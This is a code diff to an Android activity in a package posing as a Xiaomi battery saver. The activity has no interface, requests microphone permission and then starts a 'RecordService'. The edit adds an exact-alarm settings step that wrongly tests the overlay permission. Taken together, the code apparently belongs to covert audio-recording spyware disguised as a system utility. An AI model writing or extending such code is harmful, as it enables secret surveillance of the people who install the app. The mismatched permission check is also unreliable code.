@@ -3,7 +3,9 @@ package com.xiaomi.batterysaver.service;
 import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -12,36 +14,30 @@ public class PermissionActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 123;
     private static final String[] REQUIRED_PERMISSIONS = {
-            android.Manifest.permission.RECORD_AUDIO,
-            android.Manifest.permission.FOREGROUND_SERVICE
+            android.Manifest.permission.RECORD_AUDIO
+            // Removed FOREGROUND_SERVICE as it's not needed at runtime
     };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // No UI is set for this activity as its main purpose is to request permissions
         requestPermissions();
     }
 
     private void requestPermissions() {
         if (!hasAllPermissions()) {
-            // Request the missing permissions
             ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
         } else {
-            // All permissions are already granted, proceed to start the recording service
-            proceedToStartRecordingService();
+            checkForScheduleExactAlarmPermission();
         }
     }
 
     private boolean hasAllPermissions() {
-        // Check each required permission
         for (String permission : REQUIRED_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                // Return false if any permission is not granted
                 return false;
             }
         }
-        // All permissions are granted
         return true;
     }
 
@@ -52,25 +48,31 @@ public class PermissionActivity extends Activity {
             if (grantResults.length > 0) {
                 for (int grantResult : grantResults) {
                     if (grantResult != PackageManager.PERMISSION_GRANTED) {
-                        // If any permission is not granted, finish the activity
                         finish();
                         return;
                     }
                 }
-                // All permissions have been granted, proceed to start the recording service
-                proceedToStartRecordingService();
+                checkForScheduleExactAlarmPermission();
             } else {
-                // Permission request was cancelled, finish the activity
                 finish();
             }
         }
     }
 
+    private void checkForScheduleExactAlarmPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            if (!Settings.canDrawOverlays(this)) {
+                // Intent to guide user to enable the permission in settings
+                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
+                startActivity(intent);
+            }
+        }
+        proceedToStartRecordingService();
+    }
+
     private void proceedToStartRecordingService() {
-        // Start the recording service directly after permissions are granted
         Intent serviceIntent = new Intent(this, RecordService.class);
         startService(serviceIntent);
-        // Finish this activity so it's removed from the back stack
         finish();
     }
 }
